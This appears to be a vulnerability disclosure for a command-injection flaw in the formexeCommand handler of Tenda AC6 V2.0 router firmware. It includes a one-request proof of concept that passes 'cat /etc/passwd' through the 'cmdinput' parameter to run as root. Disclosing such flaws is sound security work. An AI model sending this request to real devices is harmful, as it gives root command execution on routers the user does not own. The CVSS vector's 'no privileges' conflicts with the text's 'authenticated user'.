##  Tenda AC6V2 formexeCommand Arbitrary Command Execution

### Title

```
Tenda AC6 V2.0 formexeCommand Arbitrary Command Execution
```

### Vendor / Product / Version

```
Tenda / AC6 V2.0 (AC1206) / Firmware US_AC6V2.0RTL_V15.03.06.23_multi_TD01
```

### Component

```
/bin/httpd — formexeCommand handler (0x495918)
```

### CVSS 3.1

```
9.8 (Critical) CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

### Description

```
A critical arbitrary command execution vulnerability exists in the
formexeCommand function (0x495918) of /bin/httpd in Tenda AC6 V2.0
firmware V15.03.06.23.

The function reads the "cmdinput" parameter via websGetVar() and passes
it directly to doSystemCmd("%s > /tmp/cmdTmp.txt", cmdinput), which
internally calls system(). No input validation is performed.

This allows any authenticated user to execute arbitrary OS commands as
root. The command output is written to /tmp/cmdTmp.txt.

Known CVEs CVE-2024-32283 and CVE-2024-35340 target the same function
name on FH1203 and FH1206 models respectively. AC6 V2.0 (AC1206) is
NOT listed in the affected products of those CVEs.
```

### Proof of Concept

```http
POST /goform/exeCommand HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded
Cookie: <valid_session>

cmdinput=cat /etc/passwd
```

### Affected Parameters

```
cmdinput
```

### Credit

```
Discovered by ST4R using FirmRec automated symbolic execution engine.
```

